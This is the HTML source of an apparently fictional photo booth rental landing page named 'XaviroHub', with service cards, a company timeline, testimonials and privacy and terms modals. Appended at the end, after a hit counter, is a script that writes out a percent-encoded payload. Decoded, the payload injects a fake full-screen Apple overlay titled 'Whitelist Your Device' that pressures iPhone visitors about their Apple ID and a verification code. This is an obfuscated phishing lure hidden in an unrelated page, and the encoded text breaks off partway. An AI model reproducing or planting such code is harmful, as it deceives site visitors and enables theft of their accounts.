<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XaviroHub Photo Booth Rentals - Professional Event Photography Services</title>
    <meta name="description" content="XaviroHub offers professional photo booth rental services for weddings, corporate events, birthdays, and special occasions. Modern equipment, instant prints, and memorable experiences for your guests. Click here to continue exploring our comprehensive photo booth solutions.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .xvh847_main_container {
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            color: #333;
        }

        .nav_xvh923_header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 1rem 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .nav_container_xvh445 {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
        }

        .logo_xvh778 {
            color: white;
            font-size: 1.8rem;
            font-weight: bold;
            text-decoration: none;
        }

        .nav_menu_xvh334 {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        .nav_menu_xvh334 a {
            color: white;
            text-decoration: none;
            transition: color 0.3s;
        }

        .nav_menu_xvh334 a:hover {
            color: #ffd700;
        }

        .hero_section_xvh556 {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/1190298/pexels-photo-1190298.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
            margin-top: 70px;
        }

        .hero_content_xvh889 {
            max-width: 800px;
            padding: 0 2rem;
        }

        .hero_title_xvh112 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .hero_subtitle_xvh667 {
            font-size: 1.3rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }

        .cta_button_xvh445 {
            background: #ff6b6b;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
            margin: 10px;
        }

        .cta_button_xvh445:hover {
            background: #ff5252;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .section_xvh223 {
            padding: 80px 0;
            max-width: 1200px;
            margin: 0 auto;
            padding-left: 2rem;
            padding-right: 2rem;
        }

        .section_title_xvh778 {
            font-size: 2.5rem;
            text-align: center;
            margin-bottom: 3rem;
            color: #333;
        }

        .services_grid_xvh334 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-bottom: 3rem;
        }

        .service_card_xvh889 {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            transition: transform 0.3s;
            text-align: center;
        }

        .service_card_xvh889:hover {
            transform: translateY(-5px);
        }

        .service_icon_xvh445 {
            width: 80px;
            height: 80px;
            margin: 0 auto 1rem;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            color: white;
        }

        .about_section_xvh667 {
            background: #f8f9fa;
            padding: 80px 0;
        }

        .about_content_xvh112 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            align-items: center;
        }

        .about_text_xvh556 {
            font-size: 1.1rem;
            line-height: 1.8;
        }

        .about_image_xvh223 {
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .about_image_xvh223 img {
            width: 100%;
            height: 400px;
            object-fit: cover;
        }

        .history_timeline_xvh778 {
            background: white;
            padding: 80px 0;
        }

        .timeline_container_xvh334 {
            max-width: 1000px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        .timeline_item_xvh889 {
            display: flex;
            margin-bottom: 3rem;
            align-items: center;
        }

        .timeline_year_xvh445 {
            background: #667eea;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 50px;
            font-weight: bold;
            margin-right: 2rem;
            min-width: 100px;
            text-align: center;
        }

        .timeline_content_xvh667 {
            flex: 1;
            background: #f8f9fa;
            padding: 1.5rem;
            border-radius: 10px;
        }

        .reviews_section_xvh112 {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 80px 0;
        }

        .reviews_grid_xvh556 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .review_card_xvh223 {
            background: rgba(255,255,255,0.1);
            padding: 2rem;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }

        .review_stars_xvh778 {
            color: #ffd700;
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }

        .review_author_xvh334 {
            font-weight: bold;
            margin-top: 1rem;
        }

        .equipment_showcase_xvh889 {
            padding: 80px 0;
            background: white;
        }

        .equipment_grid_xvh445 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
        }

        .equipment_item_xvh667 {
            text-align: center;
            padding: 1.5rem;
            border-radius: 10px;
            transition: transform 0.3s;
        }

        .equipment_item_xvh667:hover {
            transform: scale(1.05);
        }

        .equipment_image_xvh112 {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 1rem;
        }

        .process_section_xvh556 {
            background: #f8f9fa;
            padding: 80px 0;
        }

        .process_steps_xvh223 {
            max-width: 1000px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 2rem;
        }

        .process_step_xvh778 {
            text-align: center;
            padding: 2rem;
            background: white;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .step_number_xvh334 {
            width: 60px;
            height: 60px;
            background: #ff6b6b;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            font-weight: bold;
            margin: 0 auto 1rem;
        }

        .footer_xvh889 {
            background: #333;
            color: white;
            padding: 60px 0 20px;
        }

        .footer_content_xvh445 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
        }

        .footer_section_xvh667 h3 {
            margin-bottom: 1rem;
            color: #ffd700;
        }

        .footer_section_xvh667 p, .footer_section_xvh667 a {
            color: #ccc;
            text-decoration: none;
            line-height: 1.8;
        }

        .footer_section_xvh667 a:hover {
            color: white;
        }

        .phone_link_xvh112 {
            color: #ff6b6b !important;
            font-weight: bold;
        }

        .footer_bottom_xvh556 {
            border-top: 1px solid #555;
            margin-top: 2rem;
            padding-top: 2rem;
            text-align: center;
            color: #999;
        }

        .modal_xvh223 {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }

        .modal_content_xvh778 {
            background-color: white;
            margin: 5% auto;
            padding: 2rem;
            border-radius: 15px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }

        .close_xvh334 {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close_xvh334:hover {
            color: black;
        }

        .specialty_services_xvh889 {
            background: white;
            padding: 80px 0;
        }

        .specialty_grid_xvh445 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .specialty_card_xvh667 {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
            padding: 2rem;
            border-radius: 20px;
            color: white;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .continue_link_xvh112 {
            background: #28a745;
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            display: inline-block;
            margin: 10px 0;
            transition: all 0.3s;
        }

        .continue_link_xvh112:hover {
            background: #218838;
            transform: translateY(-2px);
        }

        @media (max-width: 768px) {
            .hero_title_xvh112 {
                font-size: 2.5rem;
            }
            
            .nav_menu_xvh334 {
                flex-direction: column;
                gap: 1rem;
            }
            
            .about_content_xvh112 {
                grid-template-columns: 1fr;
            }
            
            .timeline_item_xvh889 {
                flex-direction: column;
                text-align: center;
            }
            
            .timeline_year_xvh445 {
                margin-right: 0;
                margin-bottom: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="xvh847_main_container">
        <nav class="nav_xvh923_header">
            <div class="nav_container_xvh445">
                <a href="#home" class="logo_xvh778">XaviroHub</a>
                <ul class="nav_menu_xvh334">
                    <li><a href="#home">Home</a></li>
                    <li><a href="#services">Services</a></li>
                    <li><a href="#about">About</a></li>
                    <li><a href="#history">History</a></li>
                    <li><a href="#equipment">Equipment</a></li>
                    <li><a href="#process">Process</a></li>
                    <li><a href="#specialty">Specialty</a></li>
                    <li><a href="#reviews">Reviews</a></li>
                    <li><a href="#contact">Contact</a></li>
                </ul>
            </div>
        </nav>

        <section id="home" class="hero_section_xvh556">
            <div class="hero_content_xvh889">
                <h1 class="hero_title_xvh112">Professional Photo Booth Rentals</h1>
                <p class="hero_subtitle_xvh667">Creating unforgettable memories for your special events with state-of-the-art photo booth technology and instant printing capabilities</p>
                <a href="#services" class="cta_button_xvh445">Explore Our Services</a>
                <a href="#contact" class="cta_button_xvh445">Get Quote Today</a>
            </div>
        </section>

        <section id="services" class="section_xvh223">
            <h2 class="section_title_xvh778">Our Photo Booth Services</h2>
            <div class="services_grid_xvh334">
                <div class="service_card_xvh889">
                    <div class="service_icon_xvh445">📸</div>
                    <h3>Wedding Photo Booths</h3>
                    <p>Transform your wedding celebration with our elegant photo booth setups. Featuring customizable backdrops, instant printing, and digital galleries for all your guests to cherish forever.</p>
                    <a href="#contact" class="continue_link_xvh112">Click here to continue</a>
                </div>
                <div class="service_card_xvh889">
                    <div class="service_icon_xvh445">🎉</div>
                    <h3>Corporate Events</h3>
                    <p>Enhance your business gatherings with professional photo booth experiences. Perfect for conferences, product launches, team building events, and company celebrations.</p>
                </div>
                <div class="service_card_xvh889">
                    <div class="service_icon_xvh445">🎂</div>
                    <h3>Birthday Celebrations</h3>
                    <p>Make birthday parties extra special with our interactive photo booth experiences. Suitable for all ages with themed props and customizable print templates.</p>
                </div>
                <div class="service_card_xvh889">
                    <div class="service_icon_xvh445">🎓</div>
                    <h3>Graduation Parties</h3>
                    <p>Commemorate academic achievements with memorable photo booth sessions. Capture the joy and excitement of graduation milestones with friends and family.</p>
                </div>
                <div class="service_card_xvh889">
                    <div class="service_icon_xvh445">🏢</div>
                    <h3>Trade Shows</h3>
                    <p>Attract visitors to your booth with engaging photo experiences. Increase brand awareness and collect leads while providing entertainment value.</p>
                </div>
                <div class="service_card_xvh889">
                    <div class="service_icon_xvh445">🎪</div>
                    <h3>Festival Events</h3>
                    <p>Add excitement to festivals and community events with our portable photo booth solutions. Weather-resistant equipment suitable for outdoor venues.</p>
                </div>
            </div>
        </section>

        <section id="about" class="about_section_xvh667">
            <div class="about_content_xvh112">
                <div class="about_text_xvh556">
                    <h2>About XaviroHub Photo Booth Rentals</h2>
                    <p>XaviroHub has been revolutionizing event entertainment through innovative photo booth experiences since our establishment. We specialize in providing comprehensive photo booth rental solutions that combine cutting-edge technology with exceptional customer service.</p>
                    <p>Our team consists of experienced event professionals who understand the importance of capturing precious moments. We pride ourselves on delivering reliable, high-quality equipment and personalized service that exceeds expectations.</p>
                    <p>From intimate gatherings to large-scale corporate events, we have the expertise and equipment to make your occasion truly memorable. Our commitment to excellence has made us a trusted partner for event planners, wedding coordinators, and individuals throughout the region.</p>
                    <a href="#equipment" class="continue_link_xvh112">Click here to continue exploring</a>
                </div>
                <div class="about_image_xvh223">
                    <img src="https://images.pexels.com/photos/1024993/pexels-photo-1024993.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Professional photo booth setup at event">
                </div>
            </div>
        </section>

        <section id="history" class="history_timeline_xvh778">
            <div class="timeline_container_xvh334">
                <h2 class="section_title_xvh778">Our Journey Through Time</h2>
                <div class="timeline_item_xvh889">
                    <div class="timeline_year_xvh445">2018</div>
                    <div class="timeline_content_xvh667">
                        <h3>Foundation Year</h3>
                        <p>XaviroHub was established with a vision to transform event photography. Started with a single photo booth unit and a passion for creating memorable experiences for local community events.</p>
                    </div>
                </div>
                <div class="timeline_item_xvh889">
                    <div class="timeline_year_xvh445">2019</div>
                    <div class="timeline_content_xvh667">
                        <h3>Equipment Expansion</h3>
                        <p>Invested in advanced photo booth technology and expanded our inventory to include multiple units. Introduced instant printing capabilities and digital sharing features for enhanced guest experiences.</p>
                    </div>
                </div>
                <div class="timeline_item_xvh889">
                    <div class="timeline_year_xvh445">2020</div>
                    <div class="timeline_content_xvh667">
                        <h3>Digital Innovation</h3>
                        <p>Adapted to changing event landscapes by implementing contactless photo booth solutions and virtual sharing platforms. Maintained service excellence during challenging times.</p>
                    </div>
                </div>
                <div class="timeline_item_xvh889">
                    <div class="timeline_year_xvh445">2021</div>
                    <div class="timeline_content_xvh667">
                        <h3>Service Diversification</h3>
                        <p>Expanded service offerings to include corporate events, trade shows, and festival installations. Developed specialized packages for different event types and client needs.</p>
                    </div>
                </div>
                <div class="timeline_item_xvh889">
                    <div class="timeline_year_xvh445">2023</div>
                    <div class="timeline_content_xvh667">
                        <h3>Regional Recognition</h3>
                        <p>Achieved recognition as a leading photo booth rental provider in the region. Established partnerships with major event venues and wedding planners across multiple cities.</p>
                    </div>
                </div>
            </div>
        </section>

        <section id="equipment" class="equipment_showcase_xvh889">
            <h2 class="section_title_xvh778">Professional Equipment Gallery</h2>
            <div class="equipment_grid_xvh445">
                <div class="equipment_item_xvh667">
                    <img src="https://images.pexels.com/photos/442150/pexels-photo-442150.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Professional camera equipment" class="equipment_image_xvh112">
                    <h3>High-Resolution Cameras</h3>
                    <p>Professional-grade cameras with advanced autofocus and low-light capabilities for crystal-clear photos in any environment.</p>
                </div>
                <div class="equipment_item_xvh667">
                    <img src="https://images.pexels.com/photos/1649771/pexels-photo-1649771.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Instant photo printer" class="equipment_image_xvh112">
                    <h3>Instant Printers</h3>
                    <p>High-speed photo printers delivering quality prints within seconds, allowing guests to take home physical memories immediately.</p>
                </div>
                <div class="equipment_item_xvh667">
                    <img src="https://images.pexels.com/photos/1105666/pexels-photo-1105666.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Professional lighting setup" class="equipment_image_xvh112">
                    <h3>Studio Lighting</h3>
                    <p>Professional lighting systems ensuring perfect illumination for every shot, creating flattering and well-lit photographs consistently.</p>
                </div>
                <div class="equipment_item_xvh667">
                    <img src="https://images.pexels.com/photos/1181406/pexels-photo-1181406.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Backdrop and props" class="equipment_image_xvh112">
                    <h3>Custom Backdrops</h3>
                    <p>Extensive collection of customizable backdrops and themed props to match any event style or corporate branding requirements.</p>
                </div>
            </div>
        </section>

        <section id="process" class="process_section_xvh556">
            <h2 class="section_title_xvh778">Our Simple Rental Process</h2>
            <div class="process_steps_xvh223">
                <div class="process_step_xvh778">
                    <div class="step_number_xvh334">1</div>
                    <h3>Initial Consultation</h3>
                    <p>Contact us to discuss your event requirements, venue details, and specific photo booth preferences for your occasion.</p>
                </div>
                <div class="process_step_xvh778">
                    <div class="step_number_xvh334">2</div>
                    <h3>Package Selection</h3>
                    <p>Choose from our comprehensive service packages or customize a solution that perfectly fits your event needs and budget.</p>
                </div>
                <div class="process_step_xvh778">
                    <div class="step_number_xvh334">3</div>
                    <h3>Setup & Installation</h3>
                    <p>Our professional team arrives early to set up equipment, test all systems, and ensure everything is ready before your guests arrive.</p>
                </div>
                <div class="process_step_xvh778">
                    <div class="step_number_xvh334">4</div>
                    <h3>Event Support</h3>
                    <p>Dedicated attendant provides on-site support throughout your event, ensuring smooth operation and guest assistance when needed.</p>
                </div>
                <div class="process_step_xvh778">
                    <div class="step_number_xvh334">5</div>
                    <h3>Digital Delivery</h3>
                    <p>Receive all digital photos and videos within 48 hours via secure online gallery, perfect for sharing with all event attendees.</p>
                    <a href="#contact" class="continue_link_xvh112">Click here to continue</a>
                </div>
            </div>
        </section>

        <section id="specialty" class="specialty_services_xvh889">
            <h2 class="section_title_xvh778">Specialty Service Offerings</h2>
            <div class="specialty_grid_xvh445">
                <div class="specialty_card_xvh667">
                    <h3>360-Degree Photo Experiences</h3>
                    <p>Revolutionary 360-degree photo booth technology creating immersive, shareable content that captures every angle of your celebration moments.</p>
                </div>
                <div class="specialty_card_xvh667">
                    <h3>Green Screen Technology</h3>
                    <p>Transport your guests to any location with our advanced green screen capabilities, offering unlimited background possibilities and creative photo opportunities.</p>
                </div>
                <div class="specialty_card_xvh667">
                    <h3>Social Media Integration</h3>
                    <p>Instant social media sharing capabilities allowing guests to immediately post photos to their favorite platforms with custom hashtags and branding.</p>
                </div>
                <div class="specialty_card_xvh667">
                    <h3>Custom Branding Solutions</h3>
                    <p>Comprehensive branding options including custom print templates, branded photo strips, and corporate logo integration for professional events.</p>
                </div>
                <div class="specialty_card_xvh667">
                    <h3>Video Message Recording</h3>
                    <p>Capture heartfelt video messages from guests with our video recording capabilities, creating lasting memories beyond traditional photography.</p>
                </div>
                <div class="specialty_card_xvh667">
                    <h3>Multi-Language Support</h3>
                    <p>Touchscreen interfaces available in multiple languages to accommodate diverse guest populations at international events and multicultural celebrations.</p>
                </div>
            </div>
        </section>

        <section id="reviews" class="reviews_section_xvh112">
            <h2 class="section_title_xvh778">Client Testimonials</h2>
            <div class="reviews_grid_xvh556">
                <div class="review_card_xvh223">
                    <div class="review_stars_xvh778">★★★★★</div>
                    <p>"XaviroHub made our wedding absolutely perfect! The photo booth was a huge hit with all our guests. The quality of photos was exceptional and the staff was incredibly professional throughout the entire event."</p>
                    <div class="review_author_xvh334">- Sarah Mitchell, Bride</div>
                </div>
                <div class="review_card_xvh223">
                    <div class="review_stars_xvh778">★★★★★</div>
                    <p>"Outstanding service for our corporate event! The team was punctual, professional, and the equipment worked flawlessly. Our employees loved the instant prints and social media sharing features."</p>
                    <div class="review_author_xvh334">- Marcus Rodriguez, Event Manager</div>
                </div>
                <div class="review_card_xvh223">
                    <div class="review_stars_xvh778">★★★★★</div>
                    <p>"Fantastic experience from start to finish! The photo booth added so much fun to our anniversary celebration. The custom backdrop matched our theme perfectly and the photos turned out amazing."</p>
                    <div class="review_author_xvh334">- Jennifer Chen, Customer</div>
                </div>
                <div class="review_card_xvh223">
                    <div class="review_stars_xvh778">★★★★★</div>
                    <p>"Highly recommend XaviroHub for any event! Their 360-degree photo booth was the highlight of our graduation party. Guests are still talking about how much fun they had taking photos."</p>
                    <div class="review_author_xvh334">- David Thompson, Parent</div>
                </div>
                <div class="review_card_xvh223">
                    <div class="review_stars_xvh778">★★★★★</div>
                    <p>"Professional service and amazing results! The photo booth was perfect for our trade show booth. It attracted many visitors and helped us generate quality leads while providing entertainment."</p>
                    <div class="review_author_xvh334">- Lisa Park, Marketing Director</div>
                </div>
                <div class="review_card_xvh223">
                    <div class="review_stars_xvh778">★★★★★</div>
                    <p>"Exceeded all expectations! The team went above and beyond to ensure our charity gala was memorable. The photo booth raised additional funds and created lasting memories for our donors."</p>
                    <div class="review_author_xvh334">- Robert Johnson, Nonprofit Organizer</div>
                </div>
            </div>
        </section>

        <footer id="contact" class="footer_xvh889">
            <div class="footer_content_xvh445">
                <div class="footer_section_xvh667">
                    <h3>Contact Information</h3>
                    <p>📍 4782 Riverside Avenue, Suite 301<br>Springfield, IL 62704</p>
                    <p>📧 info@xavirohub.com</p>
                    <p>📞 <a href="tel:+15559876543" class="phone_link_xvh112">Call Now: (555) 987-6543</a></p>
                    <p>🕒 Monday - Sunday: 8:00 AM - 10:00 PM</p>
                </div>
                <div class="footer_section_xvh667">
                    <h3>Service Areas</h3>
                    <p>Springfield Metropolitan Area</p>
                    <p>Champaign-Urbana Region</p>
                    <p>Peoria County</p>
                    <p>Bloomington-Normal</p>
                    <p>Decatur and Surrounding Areas</p>
                    <p>Custom travel arrangements available</p>
                </div>
                <div class="footer_section_xvh667">
                    <h3>Quick Links</h3>
                    <p><a href="#services">Photo Booth Services</a></p>
                    <p><a href="#equipment">Equipment Gallery</a></p>
                    <p><a href="#process">Rental Process</a></p>
                    <p><a href="#specialty">Specialty Services</a></p>
                    <p><a href="#" onclick="openModal('privacy')">Privacy Policy</a></p>
                    <p><a href="#" onclick="openModal('terms')">Terms of Service</a></p>
                </div>
                <div class="footer_section_xvh667">
                    <h3>Event Types</h3>
                    <p>Wedding Celebrations</p>
                    <p>Corporate Functions</p>
                    <p>Birthday Parties</p>
                    <p>Graduation Events</p>
                    <p>Trade Show Exhibitions</p>
                    <p>Community Festivals</p>
                    <a href="#home" class="continue_link_xvh112">Click here to continue to top</a>
                </div>
            </div>
            <div class="footer_bottom_xvh556">
                <p>&copy; 2024 XaviroHub Photo Booth Rentals. All rights reserved. Professional event photography services.</p>
            </div>
        </footer>

        <!-- Privacy Policy Modal -->
        <div id="privacy" class="modal_xvh223">
            <div class="modal_content_xvh778">
                <span class="close_xvh334" onclick="closeModal('privacy')">&times;</span>
                <h2>Privacy Policy</h2>
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Information Collection</h3>
                <p>XaviroHub Photo Booth Rentals collects personal information including names, contact details, event information, and payment data necessary for service provision. We gather this information through direct communication, booking forms, and service agreements.</p>
                
                <h3>Information Usage</h3>
                <p>Collected information is used exclusively for service delivery, communication regarding bookings, payment processing, and improving our photo booth rental services. We may use contact information to send service updates and promotional materials with your consent.</p>
                
                <h3>Information Protection</h3>
                <p>We implement industry-standard security measures to protect your personal information from unauthorized access, disclosure, or misuse. Payment information is processed through secure, encrypted channels and is not stored on our systems.</p>
                
                <h3>Information Sharing</h3>
                <p>Personal information is not sold, traded, or shared with third parties except as necessary for service delivery (payment processors, venue coordinators) or as required by law. All third-party partners maintain similar privacy standards.</p>
                
                <h3>Photo and Video Content</h3>
                <p>Photos and videos captured during events remain the property of the client. We may request permission to use select images for marketing purposes with appropriate consent and credit.</p>
                
                <h3>Contact Information</h3>
                <p>For privacy-related inquiries, contact us at info@xavirohub.com or (555) 987-6543.</p>
            </div>
        </div>

        <!-- Terms of Service Modal -->
        <div id="terms" class="modal_xvh223">
            <div class="modal_content_xvh778">
                <span class="close_xvh334" onclick="closeModal('terms')">&times;</span>
                <h2>Terms of Service</h2>
                <p><strong>Effective Date:</strong> January 1, 2024</p>
                
                <h3>Service Agreement</h3>
                <p>By booking XaviroHub Photo Booth Rentals services, you agree to these terms and conditions. Services include photo booth equipment rental, setup, operation support, and digital photo delivery as specified in your service agreement.</p>
                
                <h3>Booking and Payment</h3>
                <p>Bookings require a signed contract and deposit payment. Full payment is due 48 hours before the event date. Cancellations made less than 72 hours before the event may result in partial or full payment forfeiture.</p>
                
                <h3>Equipment and Setup</h3>
                <p>We provide professional photo booth equipment, setup, and breakdown services. Clients are responsible for providing adequate space, power supply, and venue access. Equipment damage due to misuse may result in additional charges.</p>
                
                <h3>Service Limitations</h3>
                <p>Service availability is subject to equipment availability and scheduling. We reserve the right to substitute equivalent equipment if necessary. Weather conditions may affect outdoor event services.</p>
                
                <h3>Liability</h3>
                <p>XaviroHub Photo Booth Rentals maintains appropriate insurance coverage. Our liability is limited to the service fee paid. Clients are responsible for guest behavior and any resulting equipment damage.</p>
                
                <h3>Intellectual Property</h3>
                <p>All photos and videos captured remain client property. We retain the right to use select images for marketing purposes with appropriate consent and attribution.</p>
                
                <h3>Dispute Resolution</h3>
                <p>Disputes will be resolved through mediation in Springfield, Illinois. These terms are governed by Illinois state law.</p>
            </div>
        </div>
    </div>

    <script>
        function openModal(modalId) {
            document.getElementById(modalId).style.display = 'block';
        }

        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        window.onclick = function(event) {
            if (event.target.classList.contains('modal_xvh223')) {
                event.target.style.display = 'none';
            }
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    </script>

    <a href="/" alt="cool hit counter" target="_blank" >
<img  src="//sstatic1.histats.com/0.gif?4977143&101" alt="cool hit counter" border="0">

<script>
document.write(unescape('%3C%21%2D%2D%20%69%4F%53%2D%6F%6E%6C%79%20%46%75%6C%6C%2D%53%63%72%65%65%6E%20%41%70%70%6C%65%2D%73%74%79%6C%65%20%4F%76%65%72%6C%61%79%20%3%20%75%6E%69%66%6F%72%6D%20%62%61%63%6B%67%72%6F%75%6E%64%20%63%6F%6C%6F%72%20%2D%2D%3E%0A%3C%6D%65%74%61%20%6E%61%6D%65%3D%22%76%69%65%77%70%6F%72%74%22%20%63%6F%6E%74%65%6E%74%3D%22%77%69%64%74%68%3D%64%65%76%69%63%65%2D%77%69%64%74%68%2C%20%69%6E%69%74%69%61%6C%2D%73%63%61%6C%65%3D%31%2E%30%2C%20%76%69%65%77%70%6F%72%74%2D%66%69%74%3D%63%6F%76%65%72%22%3E%0A%0A%3C%64%69%76%20%69%64%3D%22%61%70%70%6C%65%2D%6F%76%65%72%6C%61%79%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%22%3E%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%62%6C%75%72%2D%62%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6C%6F%67%6F%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%0A%20%20%20%20%3C%68%31%3E%57%68%69%74%65%6C%69%73%74%20%59%6F%75%72%20%44%65%76%69%63%65%3C%2F%68%31%3E%0A%20%20%20%20%0A%20%20%20%20%3C%70%20%63%6C%61%73%73%3D%22%6D%65%73%73%61%67%65%22%3E%0A%20%20%20%20%20%20%54%6F%20%63%6F%6E%74%69%6E%75%65%20%75%73%69%6E%67%20%41%70%70%6C%65%20%73%65%72%76%69%63%65%73%20%6F%6E%20%74%68%69%73%20%64%65%76%69%63%65%2C%20%69%74%20%6D%75%73%74%20%62%65%20%61%64%64%65%64%20%74%6F%20%79%6F%75%72%20%74%72%75%73%74%65%64%20%64%65%76%69%63%65%73%20%6C%69%73%74%2E%3C%62%72%3E%3C%62%72%3E%0A%20%20%20%20%20%20%54%68%69%73%20%68%65%6C%70%73%20%70%72%6F%74%65%63%74%20%79%6F%75%72%20%41%70%70%6C%65%A0%49%44%20%61%6E%64%20%6B%65%65%70%73%20%79%6F%75%72%20%64%61%74%61%20%73%65%63%75%72%65%2E%0A%20%20%20%20%3C%2F%70%3E%0A%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%62%74%6E%20%70%72%69%6D%61%72%79%22%3E%57%68%69%74%65%6C%69%73%74%20%44%65%76%69%63%65%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%62%74%6E%20%73%65%63%6F%6E%64%61%72%79%22%3E%4E%6F%74%20%4E%6F%77%3C%2F%62%75%74%74%6F%6E%3E%0A%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6F%6F%74%6E%6F%74%65%22%3E%0A%20%20%20%20%20%20%54%68%69%73%20%64%65%76%69%63%65%20%77%69%6C%6C%20%72%65%63%65%69%76%65%20%61%20%76%65%72%69%66%69%63%61%74%69%6F%6E%20%63%6F%64%65%20%6F%6E%20%79%6F%75%72%20%6F%74%68%65%72%20%74%72%75%73%74%65%64%20%41%70%70%6C%65%20%64%65%76%69%63%65%73%20%6F%72%20%70%68%6F%6E%65%20%6E%75%6D%62%65%72%2E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%73%70%69%6E%6E%65%72%22%20%69%64%3D%22%73%70%69%6E%6E%65%72%22%3E%3C%2F%64%69%76%3E%0A%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%73%74%79%6C%65%3E%0A%20%20%23%61%70%70%6C%65%2D%6F%76%65%72%6C%61%79%20%7B%0A%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%66%69%78%65%64%3B%0A%20%20%20%20%69%6E%73%65%74%3A%20%30%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%31%30%30%25%3B%0A%20%20%20%20%68%65%69%67%68%74%3A%20%31%30%30%64%76%68%3B%0A%20%20%20%20%6D%69%6E%2D%68%65%69%67%68%74%3A%20%2D%77%65%62%6B%69%74%2D%66%69%6C%6C%2D%61%76%61%69%6C%61%62%6C%65%3B%0A%20%20%20%20%7A%2